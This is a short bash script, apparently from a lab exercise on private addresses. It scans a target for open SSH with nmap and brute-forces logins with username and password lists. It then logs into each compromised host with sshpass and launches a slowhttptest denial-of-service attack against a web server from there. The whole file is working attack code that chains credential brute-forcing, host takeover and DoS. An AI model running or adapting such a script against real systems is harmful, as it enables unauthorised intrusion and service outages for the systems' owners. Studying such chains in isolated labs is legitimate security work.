#!/bin/bash -x

rm credential*
rm test*
sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install nmap
sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install sshpass
#sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install python-pip
sudo apt-get update
#pip install paramiko
#nmap -T4 -F $1 > test1.txt
#sleep 10
#python attack1.py > credential1.txt

nmap -p 22,80 $1 --open -oG - | awk '/22\/open\/tcp\/\/ssh/{print $2}' > credential1.txt
while IFS= read -r p;do
	python SSHBruteForce.py -i $p -U ./usernames.txt -P ./passwords.txt -d true >> test.txt >> test1.txt
	python attack.py > credential2.txt
	i=1
	rm test.txt
#while read line; do
#sshpass -p 'vagrant' ssh vagrant@172.16.10.2	
#done < credentials1.txt

	IFS=' ' read -r -a array <<< "$(cat credential2.txt)"
	echo "${array[1]}"
	echo "$p"
	sshpass -p "${array[0]}" ssh -t  "${array[1]}"@$p 'sudo DEBIAN_FRONTEND=noninteractive apt-get -yq install slowhttptest; slowhttptest -c 1000 -H -g -o apache_no_mitigation -i 10 -r 2 -t GET -u http://172.16.4.2 -x 24 -p 3 -l 120' < /dev/null
done <credential1.txt
